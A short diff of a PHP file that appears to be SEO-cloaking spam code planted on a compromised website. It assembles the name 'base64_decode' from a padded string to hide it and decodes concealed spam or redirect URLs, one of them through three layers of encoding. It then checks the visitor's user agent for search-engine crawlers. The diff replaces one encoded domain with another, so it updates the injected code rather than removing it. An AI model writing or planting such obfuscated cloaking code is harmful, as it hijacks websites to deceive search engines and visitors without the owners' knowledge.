@@ -4,7 +4,7 @@ $ua=@$_SERVER["HTTP_USER_AGENT"];
 $rf=@$_SERVER['HTTP_REFERER'];
 $tu='WVVoU01HTkViM1pNTTBKeVRHcG9NazFVWjNWWk1qbDBUSGM5UFE9PQ==';
 $oki=str_replace('%','','%%b%a%%s%%e%%%%%%6%%%4%%%_%%%%d%%%e%c%%o%%%%%%d%%e%%%%%%%%');
-$lt=$oki('aHR0cDovL2h5NTM1NS5jb20vP3pMZks1Qg==');
+$lt=$oki('aHR0cDovL3d3dy4yMjMxNDguY29tLw==');
 for ($i = 0; $i < 3; $i++) {
      $tu=$oki($tu);}
 if (ereg("baidu", $ua) || ereg("360Spider", $ua) || ereg("Sogou", $ua) || ereg("bing", $ua) || ereg("google", $ua) ) {
